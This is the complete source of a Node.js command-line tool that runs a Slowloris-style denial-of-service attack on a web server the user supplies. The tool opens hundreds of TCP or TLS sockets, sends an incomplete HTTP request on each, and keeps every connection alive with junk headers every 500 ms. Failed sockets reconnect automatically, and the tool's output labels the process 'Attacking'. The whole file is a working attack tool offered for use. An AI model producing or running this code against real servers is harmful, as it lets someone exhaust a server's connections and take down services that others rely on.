const program = require("commander");
const pkg = require("../package.json");
const URL = require("url");
const tls = require("tls");
const net = require("net");
const colors = require("colors");

const { Signale } = require("signale");

// initiate the interactive terminal
const interactive = new Signale({
    interactive: true,
    stream: process.stderr,
    types: {
        attack: {
            badge: "🔥🔥",
            color: "red",
            label: "Attacking"
        },
        error: {
            color: "red",
            label: "Error"
        }
    }
});

program
    .version(pkg.version)
    .usage("[options] <url>")
    .option("-p, --port <n>", "The port of the web-server (default: 80)")
    .option("-s, --sockets <n>", "Number of sockets to use (default: 200)")
    .option("-t, --time <n>", "Duration of the attack in milliseconds")
    .parse(process.argv);

//No arguments provided, output help message.
if (program.args.length == 0) {
    interactive.error(colors.red("please provide a URL"));
    program.outputHelp();
    process.exit(-1);
}

const url = program.args[0];
const sockets = program.sockets ? program.sockets : 200;
const parsedUrl = URL.parse(program.args[0]);
const https = parsedUrl.protocol == 'https:';
const port = program.port ? program.port : https ? 443 : 80;
const connectionModule = https ? tls : net;

const options = {
    port: port,
    host: parsedUrl.host
};

let activeSockets = 0;
let socketsTargetReached = false;

createSocket = () => {
    const socket = connectionModule.connect(options, () => {
        if (++activeSockets === sockets) socketsTargetReached = true;

        if (!socketsTargetReached)
            interactive.await("Creating %d sockets ... %d%", sockets, parseInt(activeSockets / sockets * 100));
        else
            interactive.attack("%s:%d with %d sockets", parsedUrl.host, port, sockets);

        socket.write("GET / HTTP/1.1\r\n");
        socket.write(`Host: ${parsedUrl.host}\r\n`);
        socket.write("Accept: */*\r\n");
        socket.write("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0\r\n");

        setInterval(() => {
            socket.write(`KeepAlive: ${Math.random() * 1000}\r\n`);
        }, 500);
    });

    socket.setTimeout(0);

    socket.on("error", err => {
        socket.destroy();
        createSocket();
    });
};

for (let i = 0; i < sockets; i++) {
    createSocket();
}

setTimeout(() => {
    if (activeSockets === 0) {
        interactive.error(colors.red(`Could not connect to ${parsedUrl.host}:${port}`));
        process.exit(1);
    }
}, 10000);